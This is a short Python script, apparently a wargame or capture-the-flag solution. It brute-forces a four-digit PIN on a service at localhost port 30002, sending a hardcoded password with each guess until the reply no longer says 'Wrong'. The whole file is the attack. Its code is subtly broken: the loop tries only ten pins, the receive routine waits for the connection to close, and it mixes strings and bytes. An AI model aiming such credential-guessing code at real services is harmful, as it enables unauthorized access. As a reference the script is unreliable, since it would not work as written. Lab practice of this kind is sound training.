#!/bin/python

import socket

class Brutepin:

    def __init__(self, sock=None):
        self.pw = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

        if sock is None:
            self.sock = socket.socket(
                socket.AF_INET, socket.SOCK_STREAM)
        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, msg):
        totalsent = 0
        while totalsent < len(msg):
            sent = self.sock.send(msg[totalsent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            totalsent = totalsent + sent

    def receive(self):
        total_data=[]
        while True:
            data = self.sock.recv(8192)
            if not data: break
            total_data.append(data)
        return ''.join(total_data)

    def newpin(self, pin):
        return self.pw + ' ' + format(pin, '04')



b = Brutepin()
b.connect("127.0.0.1", 30002)
b.receive()

for i in range(0, 10):
    newpin = b.newpin(i)
    print ("Testing pin: " + newpin)
    b.send(newpin)
    res = b.receive()
    print(res)
    if "Wrong" not in res:
        print(res)
        break
